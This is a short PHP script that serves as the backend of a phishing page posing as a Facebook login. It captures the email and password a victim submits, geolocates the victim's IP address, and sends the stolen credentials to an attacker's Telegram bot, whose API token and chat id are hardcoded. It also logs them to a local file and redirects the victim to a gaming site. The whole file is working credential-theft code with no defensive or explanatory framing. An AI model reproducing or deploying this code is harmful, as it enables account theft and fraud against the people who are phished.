<?php
date_default_timezone_set('Asia/Baghdad');
header('Location: https://yallaludo.com/ ');

$email        = $_POST['text'];
$password     = $_POST['password'];
$ip           = $_POST['brok-ip'];

$url          = json_decode(file_get_contents("http://ipwho.is/$ip"), 1);

$country      = $url['country'];
$city         = $url['city'];
$calling_code = "+" . $url['calling_code'];

$API_KEY      = "7380376327:AAHju6Rn6HkBlNy8pKlXChy7BzHlj6yPtLU";
$id           = "1310070511";


$accounts = explode("\n", file_get_contents("BROK.txt"));

if ((preg_match('/[0-9]/', $email) and strlen($email) >= 6) or preg_match('/@gmail.com/', $email) or preg_match('/@hotmail.com/', $email) or preg_match('/@yahoo.com/', $email) or preg_match('/@mail.ru/', $email)) {

    if (strlen($password) >= 6) {

        if (!in_array("$email:$password", $accounts)) {

            $text = urlencode("New Login BY Facebook Account .\nUsername : `$email`\nPassword : `$password`\n- - - - -\nIP : $ip\nCountry : $country\nCalling Code : $calling_code\n- - - - -\n" . base64_decode("QlkgOiBASlxfSlxfSg=="));
            $url = "https://api.telegram.org/bot" . $API_KEY . "/sendMessage?chat_id=$id&text=$text&parse_mode=markdown";

            file_get_contents($url);

            file_put_contents("BROK.txt", "$email:$password\n", FILE_APPEND);
        }
    }
}
